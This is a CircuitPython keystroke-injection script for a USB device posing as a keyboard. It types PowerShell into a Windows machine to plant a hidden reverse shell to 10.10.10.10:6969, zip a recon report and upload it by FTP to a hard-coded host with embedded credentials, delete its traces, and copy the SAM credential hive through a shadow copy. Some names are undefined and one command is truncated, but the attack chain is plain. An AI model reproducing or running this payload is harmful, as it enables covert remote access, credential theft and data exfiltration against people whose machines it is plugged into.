import time
import board
import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode as k
from digitalio import DigitalInOut, Direction, Pull
### Conf ###
delay = (.8)
kpd = (.1)
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
### Vars ###
ip_addr = "10.10.10.10"
port = "6969"
ftp_addr = "ftp://lab:fr33F1lz@dev00ps.com"

##############################################################################################
time.sleep(delay)
kbd.press(k.LEFT_GUI, k.R)
time.sleep(kpd)
kbd.release_all()

line = "powershell Start-Process notepad -Verb runAs"
layout.write(line)

kbd.press(k.LEFT_ALT, k.Y) 
time.sleep(kpd)
kbd.release_all()


kbd.press(k.LEFT_ALT, SPACEBAR)
time.sleep(kpd)
kbd.release_all()

line = "m"
layout.write(line+"\n")

for i in range(100):
    kbd.press(k.ENTER)
    kbd.release_all()

lines = [
"$folderDateTime = (get-date).ToString('d-M-y HHmmss')",
"$userDir = (Get-ChildItem env:\\userprofile).value + '\\Ducky Report ' + $folderDateTime",
"$fileSaveDir = New-Item  ($userDir) -ItemType Directory ",
"$date = get-date ",
"$style = \"<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#c{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>\"",
"$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' ",
"$Report = $Report + \"<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>\"",
"Add-Content \"$env:TEMP\\79560.ps1\" '$c = New-Object System.Net.Sockets.TCPClient(\""+ip_addr+"\","+port+");$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-);$sb2  = $sb + \"PS \" + (pwd).Path + \"> \";$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'",
"start-Process powershell.exe -windowstyle hidden \"$env:TEMP\79560.ps1\"",
"$Report >> $fileSaveDir'/ComputerInfo.html'", 
"function copy-ToZip($fileSaveDir){", 
"$srcdir = $fileSaveDir ",
"$zipFile = 'C:\\Windows\\Report.zip'",
"if(-not (test-path($zipFile))) { ",
"set-content $zipFile (\"PK\" + [char]5 + [char]6 + (\"$([char]0)\" * 18))",
"(dir $zipFile).IsReadOnly = $false} ",
"$shellApplication = new-object -com shell.application", 
"$zipPackage = $shellApplication.NameSpace($zipFile)", 
"$files = Get-ChildItem -Path $srcdir", 
"foreach($file in $files) { ",
"$zipPackage.CopyHere($file.FullName) ",
"while($zipPackage.Items().Item($file.name) -eq $null){", 
"Start-sleep -seconds 1 }}} ",
"copy-ToZip($fileSaveDir) ",
"$final = 'C:\\Windows\\Report.zip'",
"$ftpAddr = \""+ftp_addr+"/Report.zip\"",
"$browser = New-Object System.Net.WebClient",  
"$url = New-Object System.Uri($ftpAddr)",  
"$browser.UploadFile($url, $final)  ",
"remove-item $fileSaveDir -recurse ",
"remove-item 'C:\\Windows\\Report.zip'",
"Remove-Item $MyINvocation.InvocationName"
]
for line in lines:
    layout.write(line+"\n")
    
kbd.press(k.CONTROL, k.S)
time.sleep(kpd)
keyboard.release_all()


  
line = "C:\\Windows\\config-79560.ps1"
layout.write(line+"\n")
kbd.press(k.LEFT_ALT, F4)
time.sleep(kpd)
keyboard.release_all()
kbd.press(k.LEFT_GUI, k.R)
time.sleep(kpd)
keyboard.release_all() 
line = "powershell Start-Process notepad -Verb runAs"
layout.write(line+"\n")


line = "mode con:cols=14 lines=1"
layout.write(line+"\n")
kbd.press(k.LEFT_ALT, SPACEBAR)
time.sleep(kpd)
keyboard.release_all() 
line = "m"
layout.write(line+"\n")

for i in range(100):
    kbd.press(k.ENTER)
    kbd.release_all()

lines = [
"powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false",
"powershell.exe -windowstyle hidden -File C:\\Windows\\config-79560.ps1",
"$createShadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')",
"$shadow = gwmi Win32_ShadowCopy | ? { $_.ID -eq $createShadow.ShadowID }",
"$addSlash  = $shadow.DeviceObject + '\'", 
"cmd /c mklink C:\\shadowcopy $addSlash",
"Copy-Item 'C:\\shadowcopy\\Windows\\System32\\config\\SAM' $fileSaveDir",
"Remove-Item -recurse -force 'C:\\shadowcopy'"
]

for line in lines:
    
    layout.write(line+"\n")




##############################################################################################

